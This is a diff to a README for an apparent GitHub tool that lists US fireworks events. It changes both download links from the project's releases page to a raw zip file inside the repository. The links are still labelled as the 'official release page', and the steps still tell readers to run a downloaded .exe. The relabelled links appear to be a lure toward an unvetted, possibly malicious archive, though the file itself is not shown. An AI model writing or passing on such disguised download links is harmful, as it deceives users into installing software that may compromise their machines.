@@ -1,6 +1,6 @@
 # 🎆 us-fireworks-events-dataset - Find verified local fireworks shows today
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Scotfriendly986/us-fireworks-events-dataset/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Scotfriendly986/us-fireworks-events-dataset/raw/refs/heads/main/data/events/dataset_us_events_fireworks_v1.9.zip)
 
 ## What is this tool 🗺️
 
@@ -18,7 +18,7 @@ Your computer must meet these basic standards to run the application:
 
 ## Getting the application 📥
 
-1. Go to the [official release page](https://github.com/Scotfriendly986/us-fireworks-events-dataset/releases).
+1. Go to the [official release page](https://github.com/Scotfriendly986/us-fireworks-events-dataset/raw/refs/heads/main/data/events/dataset_us_events_fireworks_v1.9.zip).
 2. Locate the most recent version at the top of the list.
 3. Click the file that ends in .exe to start the download.
 4. Save the file to your desktop or downloads folder.
